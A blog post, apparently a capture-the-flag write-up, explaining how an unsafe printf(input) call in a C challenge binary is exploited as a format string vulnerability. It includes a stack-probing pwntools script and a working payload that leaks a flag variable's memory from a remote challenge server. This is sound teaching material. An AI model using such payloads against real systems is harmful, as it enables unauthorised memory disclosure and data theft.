---
title: "Learning about format string vulnerabilities"
date: 2025-06-18
summary: "Sometime last year, I took part in the company hackathon and came across some nice questions which were fun to solve. This post is about learning how to exploit unsafe uses of printf in C code."
draft: false
---

The problem gives us a C source file and a binary called nuformat1. Inspecting the source code:

```c
char flag[48];
.
.
 
void vuln()
{
    char input[32];
    puts("What is your name?");
    fgets(input, 18, stdin);
    printf(input);
}
 
int main()
{
    read_flag();
    vuln();
    return 0;
}
```

I did not really know what the exact vulnerability involved is, since I've never done much binary exploitation. It is obvious that the vuln is in vuln() function, so it looks like either fgets or printf are the culprits. fgets made me think of buffer overflow, but we did have the size to read hardcoded, so it did not make as much sense too. I googled around binary exploitation common vulns and printf and fgets and stumbled upon this: Format string attack


The naming of the question cannot be a coincidence to this printf vulnerability, so heads down to learn this new idea. I took help from llms and this specific resource: https://tc.gts3.org/cs6265/tut/tut05-fmtstr.html

The gist of the attack is that printf is able to help us climb the stack arbitrarily and read values AND read the strings at those addresses (indirect).
If you do not give printf a second arg but still supply formatters, it starts looking into the stack. So `printf('%p')` will print the first value on the stack as a pointer. `'%p%p'` will print both the first and the second value on the stack. More conveniently `'%[n]$p'` can help read the nth value on the stack. Not just this, but `'%[n]$s'` can read the string at the ADDRESS stored as the nth value on the stack.


So, if `'%3$p'` prints `0xCOFFEE` then `'%3$s'` will READ and print the string at `0xCOFFEE` till it finds NULL (0x0)

I wrote a small script to probe around and see what values I can see around the stack:

```python
from pwn import *
context.log_level = 'ERROR'  # Suppress pwntools output
 
def generate_format_string(start_idx, count=3):
    return 'AAA' + ' '.join([f'%{i}$p' for i in range(start_idx, start_idx + count)])
 
for i in range(1, 30, 3):
    p = process('./nuformat1')
    fmt = generate_format_string(i)
    p.recvuntil(b"What is your name?\n")
    p.sendline(fmt.encode())
    out=p.recvall().decode().strip()
    print('{} {} {}: '.format(i, i+1, i+2)+out)
    p.close()
```

The 'AAA' string is a good way to mark your own string. It shows up as 0x41 in hex.

![screenshot of the output](/nuformat1-ss-1.png "And this is what we get. Look at those 41s!")

It looks like `%8$p` prints our string! (so does %9$p)

This makes the question interesting, because we have an area of memory that we have full control over, and KNOW where it is. If I were to now put the location of the global flag variable in %8 and do %$s then I would be able to print what is in flag variable!


But of course first I need to find the location of the flag variable. I do this with objdump

```
(venv) ubuntu@ctf-machine:~/tmp/format1$ objdump -t nuformat1 | grep flag
0000000000404020 g     O .bss   0000000000000030              flag
```

This is in the bss section of the binary, so it is probably not going to change, even on the server.

So now I know that the flag variable is at `0x404020`, I just need to put `0x404020` somewhere and read it with `%[n]$s`.

Let's make our payload! I chose to put the address in %9 (for some reason %8 just didn't work for me)

```python
from pwn import *
 
payload = b"%9$s" + b"AAAA" + b"\x20\x40\x40\x00\x00\x00\x00\x00" # Little-endian business (This is 0x0000000000404020)
# payload = b'%9$s....' + p64(0x404020) # Can also write like this, p64 is a util from pwn
 
#p = process('./nuformat1')
p = remote('nuformat1-1610741707.ctf.nutanix.com', 10007)
p.recvuntil(b"What is your name?\n")
p.sendline(payload)
print(p.recvall())
```

Running this gives us our flag!
```
(venv) ubuntu@ctf-machine:~/tmp/format1$ python retro.py
[+] Opening connection to nuformat1-1610741707.ctf.server.com on port 10007: Done
[+] Receiving all data: Done (49B)
[*] Closed connection to nuformat1-1610741707.ctf.server.com port 10007
b'NuCTF{1_l0v3_f0rm4t_str1ng5_34res73fsywer}.... @@'
```

FIN